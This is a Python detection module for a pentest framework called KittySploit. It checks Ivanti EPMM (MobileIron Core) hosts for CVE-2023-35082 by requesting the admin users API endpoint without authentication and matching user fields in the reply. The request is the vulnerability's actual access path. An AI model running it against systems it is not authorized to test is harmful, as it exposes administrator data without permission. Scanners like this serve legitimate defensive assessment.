#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ivanti Endpoint Manager Mobile (EPMM), formerly MobileIron Core, Since CVE-2023-35082 arises from the same pla."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'MobileIron Core - Remote Unauthenticated API Access Detection',
        'description': 'Ivanti Endpoint Manager Mobile (EPMM), formerly MobileIron Core, Since CVE-2023-35082 arises from the same place as CVE-2023-35078, specifically the permissive nature of certain entries in the mifs web application’s security filter chain.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'ivanti', 'mobileiron', 'epmm', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.rapid7.com/blog/post/2023/08/02/cve-2023-35082-mobileiron-core-unauthenticated-api-access-vulnerability/',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-35082',
            'https://forums.ivanti.com/s/article/CVE-2023-35082-Remote-Unauthenticated-API-Access-Vulnerability-in-MobileIron-Core-11-2-and-older?language=en_US',
            'https://github.com/Chocapikk/CVE-2023-35082',
            'https://github.com/Ostorlab/KEV',
        ],
        'cve': 'CVE-2023-35082',
    }

    def run(self):
        r = self.http_request(method="GET", path='/mifs/asfV3/api/v2/admins/users', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('results', 'userId', 'name',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='critical',
                reason="MobileIron Core - Remote Unauthenticated API Access detected",
                path='/mifs/asfV3/api/v2/admins/users',
            )
            return True
        return False

